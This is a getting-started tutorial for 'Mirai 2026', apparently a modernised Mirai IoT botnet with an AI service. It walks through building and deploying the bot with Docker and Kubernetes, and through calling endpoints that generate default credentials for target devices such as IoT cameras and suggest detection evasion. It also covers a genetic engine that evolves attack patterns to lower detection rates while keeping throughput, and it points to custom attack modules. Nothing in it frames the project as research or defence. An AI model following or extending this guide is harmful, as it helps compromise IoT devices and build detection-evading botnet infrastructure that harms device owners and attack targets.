# Tutorial - Getting Started with Mirai 2026

## Part 1: Setup and Basics

### Step 1: Clone and Build

```bash
# Clone repository
git clone https://github.com/yourorg/mirai-2026.git
cd mirai-2026

# Install dependencies (Ubuntu/Debian)
sudo apt-get update
sudo apt-get install -y cmake ninja-build \
    libjson-c-dev libsodium-dev libcurl4-openssl-dev

# Build the project
cmake -B build -G Ninja -DCMAKE_BUILD_TYPE=Release
cmake --build build
```

### Step 2: Run Tests

```bash
# Run all tests
cd build
ctest --output-on-failure

# Run specific test
./test_scanner
./test_attack
```

### Step 3: Configure the Bot

```bash
# Copy example configuration
cp config/bot.example.json config/bot.json

# Edit configuration
vim config/bot.json
```

## Part 2: AI Integration

### Step 1: Start AI Service

```bash
# Install Python dependencies
cd ai/
pip install -r requirements.txt

# Start API server
python api_server.py --host 0.0.0.0 --port 5000
```

### Step 2: Generate Credentials

```bash
# Test credential generation
curl -X POST http://localhost:5000/api/credentials/generate \
  -H "Content-Type: application/json" \
  -d '{
    "target_device": "IoT Camera",
    "target_os": "Linux",
    "max_credentials": 10
  }'
```

### Step 3: Pattern Evolution

```bash
# Get evasion suggestions
curl -X POST http://localhost:5000/api/evasion/suggest \
  -H "Content-Type: application/json" \
  -d '{
    "current_pattern": {
      "payload_entropy": 0.5,
      "fragmentation": false
    }
  }'
```

## Part 3: Docker Deployment

### Step 1: Build Images

```bash
# Build bot image
docker build -f docker/Dockerfile.bot -t mirai-2026/bot:latest .

# Build AI service image
docker build -f docker/Dockerfile.ai-service -t mirai-2026/ai:latest .
```

### Step 2: Run with Docker Compose

```bash
# Start all services
docker-compose up -d

# Check status
docker-compose ps

# View logs
docker-compose logs -f ai-service
```

## Part 4: Kubernetes Deployment

### Step 1: Local Kubernetes (minikube)

```bash
# Start minikube
minikube start --cpus=4 --memory=8192

# Deploy to Kubernetes
kubectl apply -k k8s/overlays/dev/

# Port forward to access services
kubectl port-forward -n mirai-2026-dev svc/ai-service 5000:5000
```

### Step 2: Monitor Deployment

```bash
# Watch pods
kubectl get pods -n mirai-2026-dev -w

# Check logs
kubectl logs -f deployment/dev-mirai-bot -n mirai-2026-dev

# Describe pod for debugging
kubectl describe pod <pod-name> -n mirai-2026-dev
```

## Part 5: Advanced Features

### ML Pattern Evolution

```python
# In Python
from pattern_generator import PatternEvolutionEngine

engine = PatternEvolutionEngine(population_size=50)
engine.initialize_population()

# Simulate feedback
feedback = [
    {'pattern_id': i, 'detection_rate': 0.3, 'throughput': 25000}
    for i in range(50)
]

best_pattern = engine.evolve(feedback)
print(f"Best pattern: {engine.pattern_to_dict(best_pattern)}")
```

### Custom Attack Modules

See `src/attack/attack_modern.c` for examples of implementing custom attack vectors.

## Troubleshooting

### Common Issues

**Issue**: Scanner fails to initialize
```bash
# Solution: Check for CAP_NET_RAW capability
sudo setcap cap_net_raw+ep ./build/src/bot/mirai_bot
```

**Issue**: AI service connection refused
```bash
# Solution: Check if service is running
curl http://localhost:5000/health
```

**Issue**: Docker build fails
```bash
# Solution: Ensure build context is correct
docker build --no-cache -f docker/Dockerfile.bot .
```

## Next Steps

- Read `docs/ARCHITECTURE.md` for system design
- Check `docs/API.md` for AI API reference
- See `docs/SECURITY.md` for security best practices
